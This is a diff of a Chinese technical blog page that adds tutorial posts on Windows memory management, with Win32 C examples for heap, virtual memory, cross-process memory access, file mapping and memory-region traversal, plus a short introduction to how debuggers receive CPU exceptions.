+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-windows内存管理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/windows内存管理/">windows内存管理</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/windows内存管理/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>虚拟内存概念:</p>
+<ul>
+<li>每一个进程都有4GB的虚拟内存空间</li>
+<li>低2GB为用户空间,高2GB为系统空间</li>
+<li>进程中使用的全部是虚拟地址,具体虚拟地址到物理地址的转换由操作系统内核完成(分段和分页)。</li>
+<li>一个进程的虚拟空间只有使用一部分与物理内存有映射关系。对于不同进程的同一数据,物理内存中只有一份,分别映射到多个进程中。</li>
+<li>各个进程中所使用的内存数量超过物理内存的时候,操作系统还能将物理内存中暂时用不到的数据交换到硬盘中。</li>
+</ul>
+<blockquote>
+<p>堆的内存管理</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HANDLE      hHeap = HeapCreate(0, //操作选项（0代表无操作）</span><br><span class="line">		                           0, //初始大小（0代表初始大小是4KB）</span><br><span class="line">								   0);//最大有多大（0代表是可增长）</span><br><span class="line">	SYSTEM_INFO si;       //系统信息</span><br><span class="line">	GetSystemInfo(&amp;si);   // 获取系统信息</span><br><span class="line">	//在堆上分配3个页面大小的内存</span><br><span class="line">	LPVOID lpMem = HeapAlloc(hHeap, </span><br><span class="line">		HEAP_ZERO_MEMORY, </span><br><span class="line">		si.dwPageSize * 3);</span><br><span class="line">	HeapFree(hHeap, 0, lpMem);</span><br><span class="line">	HeapDestroy(hHeap);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>虚拟内存的管理</p>
+</blockquote>
+<p>虚拟内存管理按照分页来管理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//申请一块虚拟内存</span><br><span class="line">VirtualAlloc(</span><br><span class="line">    _In_opt_ LPVOID lpAddress, //分配起始位置,自动对齐到整数位置</span><br><span class="line">    _In_ SIZE_T dwSize,	//大小</span><br><span class="line">    _In_ DWORD flAllocationType,	//预定(MEM_RELEASE)还是提交(MEM_COMMIT)</span><br><span class="line">    _In_ DWORD flProtect	//保护属性</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">//释放一块虚拟内存</span><br><span class="line">VirtualFree(</span><br><span class="line">    LPVOID lpAddress,</span><br><span class="line">    _In_ SIZE_T dwSize,</span><br><span class="line">    _In_ DWORD dwFreeType</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	//申请一块可读可写的虚拟内存</span><br><span class="line">	LPVOID lpvResult = VirtualAlloc(</span><br><span class="line">		NULL,                      //内存起始地址（NULL代表系统指定）</span><br><span class="line">		1024 * 64 * 1,             // 申请内存大小，64KB * 1</span><br><span class="line">		MEM_RESERVE | MEM_COMMIT,  // 申请内存的类型，预定并调拨内存</span><br><span class="line">		PAGE_READWRITE);           // 内存的属性，可读写</span><br><span class="line">	//向内存中写入数据</span><br><span class="line">	memcpy((LPWSTR)lpvResult, L&quot;15PB!&quot;,wcslen(L&quot;15PB!&quot;)*2);</span><br><span class="line">	//MessageBox(NULL, (LPWSTR)lpvResult, NULL, MB_OK);</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line">	//将内存属性修改为只读</span><br><span class="line">	VirtualProtect(lpvResult, 1, PAGE_READONLY, &amp;dwOldProtect);</span><br><span class="line">	//再次向内存中写入数据</span><br><span class="line">	//因为没有可写属性，所以会触发访问异常（0xC0000005）</span><br><span class="line">	memcpy((LPWSTR)lpvResult, L&quot;hello&quot;, wcslen(L&quot;hello&quot;) * 2);</span><br><span class="line"></span><br><span class="line">	//释放虚拟内存</span><br><span class="line">	VirtualFree(lpvResult, //内存起始地址</span><br><span class="line">		0,                 //内存大小（如果是释放，则必须为0）</span><br><span class="line">		MEM_RELEASE);      //释放方式（MEM_RELEASE表示释放，</span><br><span class="line">	                       //   MEM_RESERVE表示保留，但内存状态</span><br><span class="line">	                       //   不再是MEM_COMMIT类型了）</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>跨进程读写虚拟内存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwPid = 6172;</span><br><span class="line">	//获取进程句柄</span><br><span class="line">	HANDLE hProcess = </span><br><span class="line">		OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"></span><br><span class="line">	if (hProcess == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;打开失败\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//申请一块内存</span><br><span class="line">	LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, 1, </span><br><span class="line">		                         MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	DWORD dwWrite;</span><br><span class="line">	BOOL bRet = WriteProcessMemory(hProcess, </span><br><span class="line">		                      lpBuf, &quot;hello&quot;, </span><br><span class="line">		                      strlen(&quot;hello&quot;) + 1, &amp;dwWrite);</span><br><span class="line"></span><br><span class="line">	if (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;写入失败\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	bRet = </span><br><span class="line">		 VirtualProtectEx(hProcess, </span><br><span class="line">		                    lpBuf, 1,</span><br><span class="line">		                    PAGE_READONLY, </span><br><span class="line">		                    &amp;dwOld);</span><br><span class="line"></span><br><span class="line">	WriteProcessMemory(hProcess,</span><br><span class="line">		lpBuf, &quot;world&quot;,</span><br><span class="line">		strlen(&quot;world&quot;) + 1, &amp;dwWrite);</span><br><span class="line"></span><br><span class="line">	char strBuf[100] = &#123;&#125;;</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	ReadProcessMemory(hProcess, lpBuf, </span><br><span class="line">		       strBuf, sizeof(strBuf), &amp;dwRead);</span><br><span class="line"></span><br><span class="line">	VirtualFreeEx(hProcess, lpBuf, 0, MEM_RELEASE);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>内存映射</p>
+</blockquote>
+<ol>
+<li>文件映射:将文件内容映射到进程虚拟内存中的技术</li>
+<li>映射成功的文件可以用视图view来引用这段内存,从而达到操作位于此段内存中文件的目的</li>
+<li>使用文件映射需要先创建映射对象,映射对象分为命名的和未命名的，命名的映射对象可以进行跨进程读写。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//打开文件，获取句柄</span><br><span class="line">HANDLE hFile = CreateFile(L&quot;123.exe&quot;, //文件路径</span><br><span class="line">	GENERIC_READ | GENERIC_WRITE,     //访问方式</span><br><span class="line">	NULL,                             //安全属性（默认）</span><br><span class="line">	NULL,                             //堆栈大小（默认）</span><br><span class="line">	OPEN_EXISTING,                    //创建标志</span><br><span class="line">	FILE_ATTRIBUTE_NORMAL,            //文件标志</span><br><span class="line">	NULL);                            //文件ID</span><br><span class="line">if (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;文件打开失败\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//创建文件映射对象</span><br><span class="line">HANDLE hMap = CreateFileMapping(hFile, //文件句柄</span><br><span class="line">	NULL,                              //安全属性</span><br><span class="line">	PAGE_READWRITE,                    //保护属性</span><br><span class="line">	NULL,                              //对象大小高字节</span><br><span class="line">	NULL,                              //对象大小低字节</span><br><span class="line">	NULL);                             //名字</span><br><span class="line"></span><br><span class="line">//与物理内存建立映射关系</span><br><span class="line">LPVOID lpMapBuf = MapViewOfFile(hMap,//映射对象</span><br><span class="line">	FILE_MAP_READ | FILE_MAP_WRITE,  //保护属性</span><br><span class="line">	NULL,                            //映射的高字节</span><br><span class="line">	NULL,                            //映射的低字节</span><br><span class="line">	NULL);                           //实际映射大小（0是默认）</span><br><span class="line">//修改文件</span><br><span class="line">char* pBuf = (char*)lpMapBuf;</span><br><span class="line">pBuf[0] = &apos;W&apos;;</span><br><span class="line">pBuf[1] = &apos;Q&apos;;</span><br><span class="line"></span><br><span class="line">//取消映射，关闭句柄</span><br><span class="line">UnmapViewOfFile(lpMapBuf);</span><br><span class="line">CloseHandle(hMap);</span><br><span class="line">CloseHandle(hFile);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ul>
+<li>命名map,跨进程读写<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">//进程A</span><br><span class="line">	//创建文件映射对象</span><br><span class="line">	HANDLE hMap = CreateFileMapping(NULL, //文件句柄</span><br><span class="line">		NULL,                              //安全属性</span><br><span class="line">		PAGE_READWRITE,                    //保护属性</span><br><span class="line">		NULL,                              //对象大小高字节</span><br><span class="line">		100,                               //对象大小低字节</span><br><span class="line">		L&quot;Map&quot;);                           //名字</span><br><span class="line"></span><br><span class="line">	//与物理内存建立映射关系</span><br><span class="line">	LPVOID lpMapBuf = MapViewOfFile(hMap,//映射对象</span><br><span class="line">		FILE_MAP_READ | FILE_MAP_WRITE,  //保护属性</span><br><span class="line">		NULL,                            //映射的高字节</span><br><span class="line">		NULL,                            //映射的低字节</span><br><span class="line">		NULL);                           //实际映射大小（0是默认）</span><br><span class="line">	</span><br><span class="line">	printf(&quot;----&gt;%s\n&quot;, (char*)lpMapBuf);</span><br><span class="line">	// 	memcpy(lpMapBuf, </span><br><span class="line">	// 	&quot;hello world&quot;, </span><br><span class="line">	// 	strlen(&quot;hello world&quot;) + 1);</span><br><span class="line"></span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">	UnmapViewOfFile(lpMapBuf);</span><br><span class="line">	CloseHandle(hMap);</span><br><span class="line"></span><br><span class="line">//进程B</span><br><span class="line">	HANDLE hMap = OpenFileMapping(FILE_MAP_ALL_ACCESS, </span><br><span class="line">        FALSE,</span><br><span class="line">		L&quot;Map&quot;);   </span><br><span class="line">	if(hMap == NULL)</span><br><span class="line">		return false;</span><br><span class="line">	//与物理内存建立映射关系</span><br><span class="line">	LPVOID lpMapBuf = MapViewOfFile(hMap,//映射对象</span><br><span class="line">		FILE_MAP_READ | FILE_MAP_WRITE,  //保护属性</span><br><span class="line">		NULL,                            //映射的高字节</span><br><span class="line">		NULL,                            //映射的低字节</span><br><span class="line">		NULL);                           //实际映射大小（0是默认）</span><br><span class="line">	//修改文件</span><br><span class="line">	char* pBuf = (char*)lpMapBuf;</span><br><span class="line">	pBuf[0] = &apos;W&apos;;</span><br><span class="line">	pBuf[1] = &apos;Q&apos;;</span><br><span class="line"></span><br><span class="line">	//取消映射，关闭句柄</span><br><span class="line">	UnmapViewOfFile(lpMapBuf);</span><br><span class="line">	CloseHandle(hMap);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>虚拟内存遍历</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enum MEMORYSTATE &#123;</span><br><span class="line">	e_stat_free = MEM_FREE,</span><br><span class="line">	e_stat_reserve = MEM_RESERVE,</span><br><span class="line">	e_stat_commit = MEM_COMMIT</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">enum MEMORYTYPE &#123;</span><br><span class="line">	e_type_image = MEM_IMAGE,</span><br><span class="line">	e_type_mapped = MEM_MAPPED,</span><br><span class="line">	e_type_private = MEM_PRIVATE,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct VMINFO &#123;</span><br><span class="line">	DWORD		address;</span><br><span class="line">	DWORD		size;</span><br><span class="line">	MEMORYSTATE state;</span><br><span class="line">&#125;VMINFO;</span><br><span class="line"></span><br><span class="line">void queryVirtualMemoryStatue(HANDLE hProcess, list&lt;VMINFO&gt;* memoryStatue) &#123;</span><br><span class="line"></span><br><span class="line">	MEMORY_BASIC_INFORMATION	mbi = &#123; 0 &#125;;</span><br><span class="line">	VMINFO						statue = &#123; 0 &#125;;</span><br><span class="line">	DWORD						dwAddress = 0;</span><br><span class="line">	DWORD						dwSize = 0;</span><br><span class="line">	BOOL						bRet = FALSE;</span><br><span class="line">	while (1) &#123;</span><br><span class="line"></span><br><span class="line">		bRet = VirtualQueryEx(hProcess,</span><br><span class="line">			(LPCVOID)dwAddress,</span><br><span class="line">			&amp;mbi,</span><br><span class="line">			sizeof(MEMORY_BASIC_INFORMATION));</span><br><span class="line">		if (bRet == FALSE)</span><br><span class="line">			break;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		statue.address = dwAddress;</span><br><span class="line">		statue.state = (MEMORYSTATE)mbi.State;</span><br><span class="line">		dwSize = mbi.RegionSize;</span><br><span class="line"></span><br><span class="line">		// 输出内存状态, </span><br><span class="line">		// 内存状态用于描述虚拟内存有没有和物理存储器进行关联.</span><br><span class="line">		// 或是否被预定.</span><br><span class="line">		// free   : 闲置,没有预定,没有和物理存储器关联</span><br><span class="line">		// reserve: 保留,被预定,没有和物理存储器关联</span><br><span class="line">		// commit : 提交,已经和物理存储器关联</span><br><span class="line">		switch (statue.state) &#123;</span><br><span class="line">		case e_stat_free:</span><br><span class="line">			printf(&quot;0x%08X : Free\n&quot;, statue.address);</span><br><span class="line">			break;</span><br><span class="line">		case e_stat_reserve:</span><br><span class="line">			printf(&quot;0x%08X : reserve\n&quot;, statue.address);</span><br><span class="line">			break;</span><br><span class="line">		case e_stat_commit:</span><br><span class="line">			printf(&quot;0x%08X : commit\n&quot;, statue.address);</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// 如果内存地址已经提交到物理内存,则遍历提交到的每一个内存块.</span><br><span class="line">		if (statue.state == e_stat_commit) &#123;</span><br><span class="line"></span><br><span class="line">			dwSize = 0;</span><br><span class="line">			LPVOID	dwAllocationBase = mbi.AllocationBase;</span><br><span class="line">			DWORD	dwBlockAddress = (DWORD)dwAddress;</span><br><span class="line">			while (1) &#123;</span><br><span class="line"></span><br><span class="line">				bRet = VirtualQueryEx(hProcess,</span><br><span class="line">					(LPCVOID)dwBlockAddress,</span><br><span class="line">					&amp;mbi,</span><br><span class="line">					sizeof(MEMORY_BASIC_INFORMATION));</span><br><span class="line">				if (bRet == FALSE) &#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				// 判断遍历出来的内存块是否是同一块.(看它们的分配的首地址是否相等.)</span><br><span class="line">				// 如果不是,则跳出循环.</span><br><span class="line">				if (mbi.AllocationBase != dwAllocationBase)</span><br><span class="line">					break;</span><br><span class="line"></span><br><span class="line">				printf(&quot;\t0x%08X &quot;, dwBlockAddress);</span><br><span class="line"></span><br><span class="line">				// 输出内存类型</span><br><span class="line">				// 内存类型表示虚拟内存是以何种方式和物理存储器进行关联</span><br><span class="line">				// image  : 是从影像文件中映射而来</span><br><span class="line">				// mapped : 内存映射</span><br><span class="line">				// private: 私有内存,其它进程无法访问.</span><br><span class="line">				switch (mbi.Type) &#123;</span><br><span class="line">				case e_type_image:</span><br><span class="line">					printf(&quot; 类型: image   &quot;);</span><br><span class="line">					break;</span><br><span class="line">				case e_type_mapped:</span><br><span class="line">					printf(&quot; 类型: mapped  &quot;);</span><br><span class="line">					break;</span><br><span class="line">				case e_type_private:</span><br><span class="line">					printf(&quot; 类型: private &quot;);</span><br><span class="line">					break;</span><br><span class="line">				default:</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				// 输出内存分页属性</span><br><span class="line">				// 内存分页属性用于表示内存分页能够进行何种访问,如读,写,执行,写时拷贝.</span><br><span class="line">				if (mbi.Protect == 0)</span><br><span class="line">					printf(&quot;---&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_EXECUTE)</span><br><span class="line">					printf(&quot;E--&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_EXECUTE_READ)</span><br><span class="line">					printf(&quot;ER-&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_EXECUTE_READWRITE)</span><br><span class="line">					printf(&quot;ERW&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_READONLY)</span><br><span class="line">					printf(&quot;-R-&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_READWRITE)</span><br><span class="line">					printf(&quot;-RW&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_WRITECOPY)</span><br><span class="line">					printf(&quot;WCOPY&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_EXECUTE_WRITECOPY)</span><br><span class="line">					printf(&quot;EWCOPY&quot;);</span><br><span class="line"></span><br><span class="line">				// 输出内存块的大小.</span><br><span class="line">				printf(&quot; 大小:0x%X\n&quot;, mbi.RegionSize);</span><br><span class="line"></span><br><span class="line">				// 索引到下一个内存块</span><br><span class="line">				dwBlockAddress += mbi.RegionSize;</span><br><span class="line"></span><br><span class="line">				// 累加内存块的大小</span><br><span class="line">				dwSize += mbi.RegionSize;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		statue.size = dwSize;</span><br><span class="line">		memoryStatue-&gt;push_back(statue);</span><br><span class="line"></span><br><span class="line">		// 遍历下一块虚拟内存.</span><br><span class="line">		dwAddress += dwSize;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/windows内存管理/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-Windows调试器编写" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/Windows调试器编写/">调试器</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/Windows调试器编写/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>CPU对调试的硬件支持<br> 外部中断称为中断,内部中断称为异常。<br> 异常的中断分为3种:故障/陷阱/终止</p>
+<pre><code>1. 故障,进入异常处理程序前,保存引发异常的CS和EIP,然后处理异常后返回异常出现的指令出接着执行。
+2. 陷阱,    进入异常处理程序前,保存引发异常的下一条指令的CS和EIP
+3. 终止,很难纠正此类错误的明确信息。
+</code></pre></blockquote>
+<p>调试器一般有以下2种形式:</p>
+<ol>
+<li>汇编级调试器:显示被调试进程正在执行的指令,只提供被调试程序的指令反汇编成汇编指令。单步调试时,以一条指令为最小单位。</li>
+<li>源码级调试:编译一个可执行文件时,一般会生成与这个可执行文件对应的调试符号文件,这个符号文件保存了大量调试信息，这个调试信息包含调试行号,函数名,全局变量名,全局对象名,局部变量名等。源码级调试器要能读取调试符号文件，并根据正在执行的二进制代码所对应的源代码文件信息,从而以源码的方式来调试程序。单步调试时,以一条源码作为最小单位。</li>
+</ol>
+<p>调试功能器:<br>CPU如何将程序异常通知操作系统?<br>CPU调用中断向量表中指向的程序，然后把异常处理交给操作系统。<br>操作系统如何将异常发送给调试器?<br>操作系统在函数内进行环境的保存(栈帧,寄存器),如果程序有调试器,则发给调试器,否则交给程序的异常处理机制(SEH,VEH,VCH等)处理。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/Windows调试器编写/">展开全文 >></a>
         </p>
       
 
@@ -1184,19 +1154,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">逆向</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Java</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1208,11 +1178,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
+                <a href="javascript:void(0)" class="js-tag color3">思考</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">思考</a>
+                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
               </li>
              
               <li class="article-tag-list-item">
